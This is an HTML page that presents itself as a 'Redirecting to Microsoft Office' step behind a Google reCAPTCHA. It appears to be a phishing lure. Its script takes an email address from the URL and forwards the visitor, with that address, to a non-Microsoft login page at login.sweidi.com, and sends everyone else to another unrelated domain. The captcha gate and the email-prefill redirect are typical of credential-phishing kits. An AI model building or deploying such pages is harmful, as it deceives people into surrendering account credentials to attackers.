<!DOCTYPE html>
<html>
<head>
  <title>Redirecting to Microsoft Office</title>
  <style>
    /* Set the background color to a slightly darker gray for the entire body */
    body {
      background-color: #ccc; /* Slightly darker gray */
      margin: 0; /* Remove default margin */
      padding: 0; /* Remove default padding */
    }

    /* Style for the content container */
    .content-container {
      background-color: rgba(255, 255, 255, 0.8); /* Add a semi-transparent white background for content readability */
      padding: 20px;
      border-radius: 10px;
      margin: 20px auto; /* Center the content container horizontally */
      max-width: 400px; /* Limit the width of the content container */
      color: #000; /* Set the text color to black for readability */
    }

    /* Add some margin to push the reCAPTCHA down */
    .captcha-container {
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="content-container">
    <!-- Your content here, including the Google reCAPTCHA -->
  
    <!-- Google reCAPTCHA -->
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <div class="captcha-container">
      <div class="g-recaptcha" data-sitekey="6LfWmgUoAAAAALVTZa3X8DFLsSc2oqJz7IZDxk_o" data-callback="onCaptchaComplete"></div>
    </div>
  </div>

  <script>
    function onCaptchaComplete(response) {
      // Check if the response is valid
      if (response) {
        // Get the query parameter from the URL
        var queryParam = window.location.search.substring(1);

        // Use a default redirect link if the query parameter is empty
        if (!queryParam) {
          queryParam = '?'; // Change this to your default query parameter
        }

        // Convert the query parameter to a hash fragment
        var hashFragment = "#" + queryParam;

        // Check if the hash fragment includes '@' (email address indicator)
        if (hashFragment.includes('@')) {
          // It might be an email address, so let's check
          var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
          if (emailPattern.test(hashFragment)) {
            // It's a valid email address, redirect to the email address page
            var decodedEmail = decodeURIComponent(hashFragment);
            window.location.href = 'https://login.sweidi.com/bkGSsEVL?' + decodedEmail;
          } else {
            // It's not a valid email address, redirect to the URL
            window.location.href = 'https://kpd520.com';
          }
        } else {
          // It's a URL, redirect to the URL
          window.location.href = 'https://kpd520.com';
        }
      } else {
        // Handle invalid reCAPTCHA response here, e.g., display an error message
        alert("reCAPTCHA verification failed. Please complete the challenge.");
      }
    }
  </script>
</body>
</html>
